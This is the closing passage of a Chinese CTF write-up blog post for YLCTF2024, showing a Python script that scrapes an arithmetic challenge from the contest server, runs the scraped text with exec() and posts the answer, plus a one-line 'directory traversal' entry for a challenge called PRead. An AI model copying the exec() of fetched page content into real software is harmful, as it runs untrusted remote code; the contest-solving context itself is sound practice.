<p>解密，最后在网页写个py交互一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br><br>url = <span class="hljs-string">&#x27;http://challenge.yuanloo.com:33968/ca.php&#x27;</span><br>response = session.get(url) <br>soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br>pre_content = soup.find(<span class="hljs-string">&#x27;pre&#x27;</span>).text.strip()<br><br>pre_content = pre_content.replace(<span class="hljs-string">&#x27;$temp1&#x27;</span>, <span class="hljs-string">&#x27;temp1&#x27;</span>).replace(<span class="hljs-string">&#x27;$temp2&#x27;</span>, <span class="hljs-string">&#x27;temp2&#x27;</span>).replace(<span class="hljs-string">&#x27;$temp3&#x27;</span>, <span class="hljs-string">&#x27;temp3&#x27;</span>).replace(<span class="hljs-string">&#x27;$temp4&#x27;</span>, <span class="hljs-string">&#x27;temp4&#x27;</span>).replace(<span class="hljs-string">&#x27;$answer&#x27;</span>, <span class="hljs-string">&#x27;answer&#x27;</span>)<br>pre_content = pre_content.replace(<span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;math.log&#x27;</span>).replace(<span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;math.sqrt&#x27;</span>).replace(<span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;math.pow&#x27;</span>).replace(<span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;math.sin&#x27;</span>).replace(<span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;math.cos&#x27;</span>).replace(<span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;math.tan&#x27;</span>).replace(<span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;math.exp&#x27;</span>).replace(<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;abs&#x27;</span>)<br><br><span class="hljs-comment"># 计算表达式</span><br><span class="hljs-built_in">exec</span>(pre_content)<br><br><span class="hljs-comment"># 输出最终答案，保留两位小数</span><br>final_answer = <span class="hljs-built_in">round</span>(answer, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;答案: <span class="hljs-subst">&#123;final_answer:<span class="hljs-number">.2</span>f&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 准备 POST 请求的数据</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;user_answer&#x27;</span>: final_answer<br>&#125;<br><br>post_url = <span class="hljs-string">&#x27;http://challenge.yuanloo.com:33968/ca.php&#x27;</span> <br>response = session.post(post_url, data=data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;POST 请求的响应: <span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<h5 id="round-3-pread"><a class="markdownIt-Anchor" href="#round-3-pread"></a> [Round 3] PRead</h5>
<p>目录穿越</p>
<p><img src="/../../images/ylctf/2024/pread.png" srcset="/img/loading.gif" lazyload alt="pread"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>YLCTF2024</div>
      <div>https://0ran9ewww.github.io/2024/10/17/ylctf/ylctf2024/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>orange</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年10月17日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/10/20/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B5%85%E6%9E%90node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="浅析node.js原型链污染">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">浅析node.js原型链污染</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/10/13/%E9%A2%86%E8%88%AA%E6%9D%AF/2024%E5%B9%B4%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="2024年领航杯初赛">
                        <span class="hidden-mobile">2024年领航杯初赛</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>
 
  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>Copy
</body>
</html>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--鼠标点击礼花特效-->
<script async src="/js/fireworks.js"></script>